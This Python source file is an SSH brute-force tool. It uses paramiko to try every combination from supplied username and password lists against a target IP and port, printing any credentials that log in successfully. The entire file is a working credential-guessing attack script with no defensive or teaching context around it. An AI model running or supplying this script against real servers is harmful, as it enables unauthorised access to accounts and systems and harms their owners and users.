import time
import paramiko
import sys
from colorama import Fore
from threading import Thread, activeCount

class Ssh:
    def __init__(self, ip, port, usernames, passwords, thread):
        self.ip = ip
        self.port = int(port)
        self.usernames = usernames
        self.passwords = passwords
        self.thr = thread
        self.isdone = False
        self.start()

    def ssh_connect(self,username,password, code=0):
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
        try:
            ssh.connect(self.ip,port=self.port,username=username,password=password, banner_timeout=400)
            ssh.close()
        except:
            ssh.close()
            pass
        else:
            self.isdone = True
            print(Fore.GREEN + f"[+] {username}:{password}")

    def start(self):
        print(Fore.GREEN + "[+] Brute force started")
        
        for u in self.usernames:
            for p in self.passwords:
                if(self.isdone == True):
                    break
                if(self.thr < activeCount()):
                    time.sleep(4)
                thr = Thread(target=self.ssh_connect, args=(u, p))
                thr.start()
                thr.join()

            if(self.isdone == True):
                    break
                
        print(Fore.LIGHTGREEN_EX + "[+] Finished")
        sys.exit()